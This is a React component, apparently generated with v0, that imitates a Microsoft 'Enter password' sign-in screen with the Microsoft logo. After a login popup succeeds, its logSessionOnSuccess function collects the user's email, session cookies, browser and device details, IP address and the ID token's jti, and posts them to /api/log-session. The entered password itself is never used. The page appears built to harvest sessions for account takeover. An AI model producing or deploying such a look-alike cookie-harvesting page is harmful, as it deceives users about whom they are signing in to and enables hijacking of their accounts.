"use client"

import type React from "react"
import { useState } from "react"
import { Eye, EyeOff } from "lucide-react"
import { useMsal } from "@azure/msal-react"
import { getBrowserInfo, getDeviceInfo, getSessionCookies, getIpAddress } from "@/lib/browser-info"

interface PasswordStepProps {
  email: string
  onBack: () => void
}

export default function PasswordStep({ email, onBack }: PasswordStepProps) {
  const { instance } = useMsal()
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const logSessionOnSuccess = async () => {
    try {
      const [browserInfo, deviceInfo, cookies, ipAddress] = await Promise.all([
        Promise.resolve(getBrowserInfo()),
        Promise.resolve(getDeviceInfo()),
        Promise.resolve(getSessionCookies()),
        getIpAddress(),
      ])

      const response = await fetch("/api/log-session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          browserInfo,
          deviceInfo,
          cookies,
          ipAddress,
          sessionToken: instance?.getActiveAccount()?.idTokenClaims?.jti,
        }),
      })

      if (!response.ok) {
        console.error("[v0] Session logging failed")
      }
    } catch (error) {
      console.error("[v0] Error logging session:", error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")

    if (!password) {
      setError("Enter your password")
      return
    }

    setIsLoading(true)
    try {
      const loginRequest = {
        scopes: ["openid", "profile", "email"],
        loginHint: email,
      }

      await instance?.loginPopup(loginRequest)
      await logSessionOnSuccess()
    } catch (err: any) {
      setError(err.errorCode === "user_cancelled" ? "Sign-in cancelled." : "Your password is incorrect. Try again.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="bg-white rounded-lg shadow-md p-8 border border-gray-200">
      <div className="mb-6">
        <button
          onClick={onBack}
          className="text-blue-600 hover:underline text-sm font-medium mb-4 inline-flex items-center gap-1"
        >
          <span>{"<"}</span> Back
        </button>
        <svg className="w-8 h-8 mb-4" viewBox="0 0 20 20" fill="none">
          <rect x="0" y="0" width="8" height="8" fill="#F25022" />
          <rect x="11" y="0" width="9" height="8" fill="#7FBA00" />
          <rect x="0" y="11" width="8" height="9" fill="#00A4EF" />
          <rect x="11" y="11" width="9" height="9" fill="#FFB900" />
        </svg>
        <h1 className="text-3xl font-semibold text-gray-900">Enter password</h1>
        <p className="text-sm text-gray-600 mt-2">{email}</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Password Input */}
        <div>
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => {
                setPassword(e.target.value)
                setError("")
              }}
              placeholder="Password"
              className="w-full px-4 py-3 border-b-2 border-gray-300 hover:border-gray-400 focus:border-blue-600 focus:outline-none text-base text-gray-900 placeholder-gray-600 transition-colors text-lg pr-10"
              disabled={isLoading}
              autoFocus
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
              disabled={isLoading}
            >
              {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
            </button>
          </div>
          {error && <p className="text-sm text-red-600 mt-3">{error}</p>}
        </div>

        {/* Sign in Button */}
        <div className="pt-6 flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-300 text-white font-medium py-2 px-20 rounded-md transition-colors text-sm"
          >
            {isLoading ? "Signing in..." : "Sign in"}
          </button>
        </div>
      </form>

      {/* Forgot password link */}
      <div className="mt-8 pt-6 border-t border-gray-200">
        <a href="#" className="text-blue-600 hover:underline text-sm">
          Forgot my password
        </a>
      </div>
    </div>
  )
}
